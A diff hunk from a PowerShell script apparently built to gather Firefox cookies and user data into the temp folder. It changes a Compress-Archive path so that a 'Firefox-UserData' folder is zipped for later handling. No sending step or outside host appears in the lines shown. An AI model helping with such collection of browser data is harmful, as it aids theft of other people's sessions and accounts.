@@ -55,7 +55,7 @@ if ($Results) {
     Write-Host "No files found."
 }
 
-Compress-Archive -Path "$env:tmp\Firefox-Cookies" -DestinationPath "$env:tmp\Firefox-UserData.zip"
+Compress-Archive -Path "$env:tmp\Firefox-UserData" -DestinationPath "$env:tmp\Firefox-UserData.zip"
 
 #---------------------------------------------------------------------------------------------------------------------------------------
 
